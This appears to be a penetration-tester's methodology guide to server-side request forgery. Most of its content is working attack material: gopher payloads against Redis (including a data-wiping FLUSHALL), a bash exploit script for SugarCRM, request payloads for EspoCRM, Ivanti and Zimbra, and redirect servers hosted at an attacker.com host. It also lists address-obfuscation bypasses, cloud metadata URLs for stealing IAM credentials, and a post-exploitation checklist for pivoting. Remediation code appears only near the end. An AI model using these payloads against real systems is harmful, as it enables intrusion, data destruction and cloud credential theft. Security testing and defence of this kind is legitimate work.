# Complete SSRF Testing and Exploitation Methodology

## Table of Contents
1. [Understanding SSRF](#understanding-ssrf)
2. [Identifying SSRF Entry Points](#identifying-ssrf-entry-points)
3. [Testing Tools Setup](#testing-tools-setup)
4. [Basic Testing Methodology](#basic-testing-methodology)
5. [Advanced Exploitation Techniques](#advanced-exploitation-techniques)
6. [Real-World Exploit Examples](#real-world-exploit-examples)
7. [Bypass Techniques](#bypass-techniques)
8. [Cloud Metadata Exploitation](#cloud-metadata-exploitation)
9. [Blind SSRF Detection](#blind-ssrf-detection)
10. [Reporting and Remediation](#reporting-and-remediation)

---

## Understanding SSRF

Server-Side Request Forgery (SSRF) is a vulnerability that occurs when an attacker can induce a server-side application to make HTTP requests to arbitrary domains of the attacker's choosing . The impact has grown significantly with cloud infrastructure adoption, where metadata services expose sensitive credentials.

**The Core Concept:** An attacker cannot directly access internal resources (like `http://localhost/admin` or `http://169.254.169.254/latest/meta-data/`) from their browser. However, if a vulnerable web application makes server-side requests based on user input, the attacker can trick the server into making those internal requests on their behalf .

**Why This Works:** Internal access controls are bypassed because the request appears to originate from a trusted source (the application server itself) .

---

## Identifying SSRF Entry Points

### Common SSRF Attack Vectors

| Vector Type | Examples |
|-------------|----------|
| URL Parameters | `?url=`, `?uri=`, `?dest=`, `?redirect=`, `?returnTo=` |
| API Endpoints | `/fetch`, `/proxy`, `/webhook`, `/callback`, `/upload` |
| File Processing | PDF generation, image resizing, document conversion |
| Integrations | Webhooks, RSS feeds, external API calls |
| Headers | `Referer`, `Origin`, `Host`, `X-Forwarded-For` |

### Hidden SSRF Surface Areas

- Review Forms (product reviews, comments with external images)
- Contact Us pages (avatar URLs, profile pictures)
- Password reset functionality (email verification links)
- Profile information (social media links, website fields)
- Video/image upload processing (especially FFmpeg HLS)
- XML parsers with external entities

---

## Testing Tools Setup

### Essential Tools

```bash
# Basic Toolkit
# Burp Suite Professional/Community
# https://portswigger.net/burp

# SSRF Testing Tools
gau domain.com | python3 ssrf.py collaborator.listener.com

# Gopher Protocol Exploitation
# https://github.com/tarunkant/Gopherus
gopherus --exploit redis

# Automated SSRF Discovery
# https://github.com/micha3lb3n/SSRFire
./ssrfire.sh -d domain.com -s yourserver.com -f raw_urls.txt

# SSRF Proxy for Pivoting
# https://github.com/bcoles/ssrf_proxy
```

### Burp Suite Configuration

1. **Set Up Collaborator**
   - Navigate to Burp → Burp Collaborator client
   - Copy your unique collaborator domain (e.g., `[random].burpcollaborator.net`)
   - Use this in your SSRF payloads 

2. **Configure Intruder for IP Enumeration**
   - Send a request with a URL parameter to Intruder
   - Add payload position: `http://192.168.0.§1§:8080/admin`
   - Set payload type to Numbers (1-255) 

3. **Cloudflare OOB Extension (Optional)**
   - For WAF bypasses, use Cloudflare Worker OOB injector
   - Deploy worker at `your-worker.workers.dev/oob`
   - Extension automatically injects OOB payloads into requests 

---

## Basic Testing Methodology

### Step 1: Initial Reconnaissance

Identify parameters that accept URLs or hostnames:

```http
GET /api/fetch?url=https://example.com/image.jpg HTTP/1.1
Host: target.com

POST /webhook HTTP/1.1
Host: target.com
Content-Type: application/json

{"callback_url": "https://example.com/notify"}
```

### Step 2: Basic SSRF Testing

Test if the server makes external requests:

```bash
# Replace the URL with your collaborator domain
https://target.com/proxy?url=http://YOUR-COLLABORATOR.burpcollaborator.net/test
```

**In Burp Suite Repeater :**
1. Right-click the request → Send to Repeater
2. Modify the URL parameter to point to your Collaborator
3. Click Send
4. Go to Collaborator tab → Poll now
5. If interactions appear, SSRF is confirmed

### Step 3: Internal Network Probing

Use Burp Intruder to scan internal IP ranges :

**Target:** `http://target.com/stock?api=http://192.168.0.§0§:8080/`

**Intruder Configuration:**
- Attack type: Sniper
- Payload type: Numbers
- Range: 1 to 255, step 1
- Look for responses with different status codes or content length

### Step 4: Service Enumeration

Test common internal ports:

| Port | Service | Test Payload |
|------|---------|--------------|
| 22 | SSH | `http://127.0.0.1:22/` |
| 80 | HTTP | `http://127.0.0.1/` |
| 443 | HTTPS | `https://127.0.0.1/` |
| 3306 | MySQL | `gopher://127.0.0.1:3306/_` |
| 6379 | Redis | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a` |
| 9200 | Elasticsearch | `http://127.0.0.1:9200/_search` |
| 11211 | Memcached | `http://127.0.0.1:11211/%0astats%0aquit` |

---

## Advanced Exploitation Techniques

### Gopher Protocol Exploitation

Gopher allows raw TCP payload delivery, making it powerful for internal service interaction.

**Redis Exploitation Example:**
```bash
# Using Gopherus
gopherus --exploit redis
# Enter: flushall
# Generated payload: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a

# URL-encoded for HTTP parameter
http://target.com/ssrf?url=gopher://127.0.0.1:6379/_*1%250d%250a%248%250d%250aFLUSHALL%250d%250a
```

**HTTP Request via Gopher:**
```bash
# GET request
gopher://target.com:80/_GET%20/index.html%20HTTP/1.1%0d%0aHost:target.com%0d%0a

# POST request with body
gopher://target.com:80/_POST%20/login.php%20HTTP/1.1%0d%0aHost:target.com%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:12%0d%0a%0d%0ausername=admin%0d%0a
```

### Redirect-Based SSRF

Some applications follow HTTP redirects. This can be exploited by hosting a malicious redirect service:

```python
# Flask redirect server
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/redirect")
def redirect_to_target():
    target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
    return redirect(target)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

**Attack Payload:**
```
http://target.com/fetch?url=http://attacker.com:5000/redirect?target=http://169.254.169.254/
```

### PDF Generation SSRF

PDF generators often have network access. Inject iframes or external images:

```svg
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image width="100%" height="100%" xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" />
</svg>
```

---

## Real-World Exploit Examples

### Example 1: EspoCRM IPv4 Notation Bypass (CVE-2026-33534)

**Vulnerability:** Authenticated SSRF allowing bypass of internal-host validation using alternative IPv4 representations .

**Root Cause:** The `HostCheck::isNotInternalHost()` function relied on PHP's `filter_var(..., FILTER_VALIDATE_IP)`, which does not recognize alternative IP formats like octal notation. The validation fell through to DNS lookup (returning no records), incorrectly treating the host as safe. However, cURL subsequently normalized the address and connected to the loopback destination .

**Exploitation Steps:**
```bash
# Step 1: Authenticate to EspoCRM (requires valid credentials)
# Step 2: Use octal notation to bypass internal host validation
# Instead of: http://127.0.0.1:8080/admin
# Use octal bypass: http://0177.0.0.1:8080/admin

# Step 3: Send request to vulnerable endpoint
POST /api/v1/Attachment/fromImageUrl HTTP/1.1
Host: target.espocrm.com
Authorization: Bearer [AUTH_TOKEN]
Content-Type: application/json

{
    "url": "http://0177.0.0.1:8080/admin"
}

# Step 4: The server fetches the internal resource and stores it as an attachment
```

**Bypass Payloads for This Technique:**
- Octal: `0177.0.0.1` (instead of `127.0.0.1`)
- Hexadecimal: `0x7F000001`
- Decimal: `2130706433`
- Mixed: `0177.0x0.0x0.1`

### Example 2: Ivanti Connect Secure SSRF (CVE-2024-21893)

**Vulnerability:** SSRF in SAML component allowing remote attackers to initiate requests to arbitrary systems .

**Real-World Impact:** Over 170 distinct IP addresses exploited this flaw. Attackers deployed a backdoor called "DSLog" inserted into `DSLog.pm` Perl file through SAML authentication requests containing encoded commands .

**Exploitation Technique:**
```http
POST /dana-ws/saml20.ws HTTP/1.1
Host: target.ivanti.com
Content-Type: text/xml

<SOAP-ENV:Envelope>
    <SOAP-ENV:Body>
        <samlp:AuthnRequest>
            <saml:Issuer>https://attacker.com/metadata</saml:Issuer>
            <!-- SSRF payload in Issuer URL -->
        </samlp:AuthnRequest>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

### Example 3: SugarCRM LESS Code Injection (CVE-2024-58258)

**Vulnerability:** Unauthenticated SSRF via LESS code injection in `/css/preview` REST API endpoint .

**Exploit Code:**
```bash
#!/bin/bash
# SugarCRM <= 14.0.0 SSRF Exploit

urlencode() {
    echo -n "$1" | xxd -p | tr -d '\n' | sed 's/../%&/g'
}

TARGET="https://target.sugarcrm.com"
SSRF_URL="http://169.254.169.254/latest/meta-data/"

INJECTION=$(urlencode "1; @import (inline) '$SSRF_URL'; @import (inline) 'data:text/plain,________';//")

curl -ks "${TARGET}rest/v10/css/preview?baseUrl=1&param=${INJECTION}"
```

**How It Works:** The `@import (inline)` LESS directive fetches external resources, allowing SSRF to arbitrary URLs .

### Example 4: Zimbra RSS Feed SSRF

**Vulnerability:** Authenticated SSRF via RSS feed parser with automatic HTTP redirect following .

**Exploitation Steps:**
1. Attacker hosts malicious redirect server:
```python
from flask import Flask, redirect, request
app = Flask(__name__)

@app.route("/redir")
def redir():
    target = request.args.get('u', 'http://127.0.0.1:8080/')
    return redirect(target)
```

2. Register malicious feed:
```http
POST /service/soap/CreateFolderRequest HTTP/2
Host: target.zimbra.com
Cookie: ZM_AUTH_TOKEN=[TOKEN]

{
    "CreateFolderRequest": {
        "folder": {
            "name": "MaliciousFeed",
            "url": "http://attacker.com:5000/redir?u=http://127.0.0.1:8080/admin"
        }
    }
}
```

3. The vulnerable Zimbra version follows redirects automatically, accessing internal services .

### Example 5: Axios NO_PROXY Bypass (CVE-2025-62718)

**Vulnerability:** Axios HTTP client incorrectly handles hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like `localhost.` (trailing dot) or `[::1]` skip NO_PROXY matching and go through the configured proxy .

**Bypass Payloads:**
```
# Instead of: http://localhost:8080/admin
# Use trailing dot: http://localhost.:8080/admin
# Or IPv6 literal: http://[::1]:8080/admin
```

### Example 6: AWS EC2 Credential Theft via SSRF

**Real Pentest Scenario :**
During an annual penetration test, a tester discovered a web application vulnerable to SSRF. The application had a transaction creation feature where parameters could be manipulated to make the server create arbitrary HTTP requests .

**Exploitation Chain:**
```bash
# Step 1: Identify SSRF in transaction endpoint
POST /model/transaction HTTP/1.0
Content-Type: application/x-www-form-urlencoded

callbackUrl=http://127.0.0.1:8080/admin

# Step 2: Target AWS Metadata Service
callbackUrl=http://169.254.169.254/latest/meta-data/

# Step 3: Enumerate IAM role
callbackUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 4: Retrieve credentials for the role
callbackUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole

# Response contains:
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2025-12-15T00:00:00Z"
}
```

**Impact:** The obtained credentials provided read/write permissions to all AWS S3 buckets containing sensitive information, elevating the finding from medium to critical severity .

---

## Bypass Techniques

### IP Address Obfuscation

| Original | Bypass Format | Example |
|----------|---------------|---------|
| Decimal | Integer | `127.0.0.1` → `2130706433` |
| Octal | Leading zeros | `127.0.0.1` → `0177.0.0.1` |
| Hex | 0x notation | `127.0.0.1` → `0x7F000001` |
| Mixed | Combined formats | `127.0.0.1` → `0177.0x0.0x0.1` |
| IPv6 | Loopback | `127.0.0.1` → `[::1]` |
| Trailing dot | DNS bypass | `localhost` → `localhost.` |

### URL Parsing Bypasses

```bash
# Using @ symbol (credential-style)
http://safedomain.com@127.0.0.1/admin

# Using # fragment
http://127.0.0.1#@safedomain.com/admin

# Using ? query
http://127.0.0.1?.safedomain.com/admin

# Double slash technique
http:////////////127.0.0.1/admin

# Unicode homoglyphs
https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com

# Newline injection (in some parsers)
http://127.0.0.1%0a.safedomain.com/admin
```

### Redirect-Based Bypass Services

Pre-built services for SSRF bypass testing:
```
https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/
```

### DNS Rebinding

Use a domain that resolves to a public IP first, then switches to an internal IP:
1. Attacker controls DNS for `evil.attacker.com`
2. Initial resolution: `1.2.3.4` (public IP, passes validation)
3. After validation, DNS changes to `127.0.0.1`
4. Application's HTTP client follows the new resolution

---

## Cloud Metadata Exploitation

### AWS EC2 Metadata

**IMDSv1 (Vulnerable to SSRF):**
```bash
# Base URL
http://169.254.169.254/latest/meta-data/

# IAM credentials (HIGH VALUE)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Instance identity
http://169.254.169.254/latest/dynamic/instance-identity/document

# User data (may contain secrets)
http://169.254.169.254/latest/user-data/

# Network configuration
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

**IMDSv2 (Requires PUT request with token):**
```bash
# Step 1: Get token
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token for requests
GET /latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: TOKEN
```

### Google Cloud Platform (GCP)

```bash
# Base metadata endpoint
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Required header
Metadata-Flavor: Google

# Service account credentials
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project information
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure Metadata

```bash
# Instance metadata
http://169.254.169.254/metadata/instance?api-version=2017-08-01

# Managed identity credentials
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Required header
Metadata: true
```

### Alibaba Cloud

```bash
# ECS metadata
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/
```

---

## Blind SSRF Detection

### What is Blind SSRF?

Blind SSRF occurs when the server makes the request but does not return the response to the attacker . Detection requires out-of-band (OOB) techniques.

### Testing for Blind SSRF in Burp Suite 

**Step-by-Step Process:**
1. Identify a request that might trigger a server-side request (webhook, callback, avatar URL)
2. Go to Burp → Burp Collaborator → Copy Collaborator domain
3. Replace the target URL with your Collaborator domain
4. Send the request
5. Go to Collaborator tab → Poll now
6. If interactions appear (DNS/HTTP), the application is vulnerable to blind SSRF

**Example Blind SSRF Test:**
```http
POST /api/webhook HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "webhook_url": "http://YOUR-COLLABORATOR.burpcollaborator.net/callback"
}
```

### Blind SSRF Payload Locations

- `Referer` header
- `User-Agent` header
- `Origin` header
- `X-Forwarded-For` header
- XML external entities
- SOAP endpoints
- RSS feed URLs
- Import/export functionality

### OOB Testing Tools

| Tool | Purpose |
|------|---------|
| Burp Collaborator | Built-in OOB detection |
| Interactsh | Free OOB service (projectdiscovery) |
| Cloudflare OOB Worker | WAF-bypassing OOB listener  |
| Canarytokens | Simple token-based detection |

---

## Reporting and Remediation

### Report Template

**Vulnerability Title:** Server-Side Request Forgery (SSRF) in [Endpoint]

**Description:**
The application at [endpoint] accepts user-supplied URLs and makes server-side requests without proper validation. This allows an attacker to induce the server to make requests to internal resources.

**Steps to Reproduce:**
1. Navigate to [URL]
2. Intercept request and modify parameter `[param]` to: `[payload]`
3. Observe server making request to internal service

**Proof of Concept:**
```http
[Full request/response]
```

**Impact:**
- Access to internal network services
- Cloud metadata credential theft
- Internal port scanning
- Potential RCE through internal service exploitation

**Remediation:**
1. Implement URL allowlisting for permitted domains
2. Validate resolved IP addresses (not just hostnames)
3. Block private IP ranges (RFC 1918, loopback, link-local)
4. Disable unused protocols (gopher, dict, file)
5. Use IMDSv2 on AWS with session tokens
6. Implement egress filtering at network level

### Remediation Code Example

**PHP - Safe URL Validation:**
```php
function isSafeUrl($url) {
    $host = parse_url($url, PHP_URL_HOST);
    $ip = gethostbyname($host);
    
    // Check both IPv4 and IPv6
    $records = dns_get_record($host, DNS_A | DNS_AAAA);
    
    $blocked = [
        '127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
        '192.168.0.0/16', '169.254.0.0/16', '::1', 'fd00::/8'
    ];
    
    foreach ($records as $record) {
        if (isset($record['ip']) && ip_in_range($record['ip'], $blocked)) {
            return false;
        }
        if (isset($record['ipv6']) && ip_in_range($record['ipv6'], $blocked)) {
            return false;
        }
    }
    return true;
}
```

**Network Egress Filtering (iptables):**
```bash
# Block web server from accessing internal networks
iptables -A OUTPUT -m owner --uid-owner www-data -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 169.254.169.254 -j DROP
```

---

## Testing Checklist

**Phase 1: Discovery**
- [ ] Identify all parameters accepting URLs or hostnames
- [ ] Test Collaborator injection in each parameter
- [ ] Check headers (Referer, Origin, Host)
- [ ] Review API documentation for webhook/callback parameters

**Phase 2: Basic Testing**
- [ ] Test localhost variants (127.0.0.1, localhost, ::1)
- [ ] Test internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- [ ] Test common internal ports (80, 443, 8080, 8443, 22, 3306, 6379)
- [ ] Test file:// protocol for local file disclosure

**Phase 3: Advanced Testing**
- [ ] Test bypass techniques (octal, hex, decimal, trailing dot)
- [ ] Test redirect-based SSRF with malicious redirect server
- [ ] Test gopher:// protocol for Redis/MySQL interaction
- [ ] Test blind SSRF with OOB techniques

**Phase 4: Cloud Exploitation**
- [ ] Test AWS metadata endpoint (169.254.169.254)
- [ ] Test GCP metadata (metadata.google.internal)
- [ ] Test Azure metadata (169.254.169.254/metadata)
- [ ] Test Alibaba metadata (100.100.100.200)

**Phase 5: Post-Exploitation**
- [ ] Extract IAM credentials if applicable
- [ ] Enumerate internal network services
- [ ] Attempt to pivot to internal hosts
- [ ] Document all accessible resources

---

## References

1. PortSwigger - Testing for SSRF with Burp Suite 
2. PortSwigger - Testing for Blind SSRF with Burp Suite 
3. CVE-2026-33534 - EspoCRM SSRF via Alternative IPv4 Notation 
4. CVE-2024-21893 - Ivanti Connect Secure SSRF 
5. CVE-2024-58258 - SugarCRM SSRF via LESS Injection 
6. CVE-2025-62718 - Axios NO_PROXY Bypass 
7. OnSecurity - Pentest Files: EC2 Credential Retrieval via SSRF 
8. Zimbra SSRF via RSS Feed Redirect 
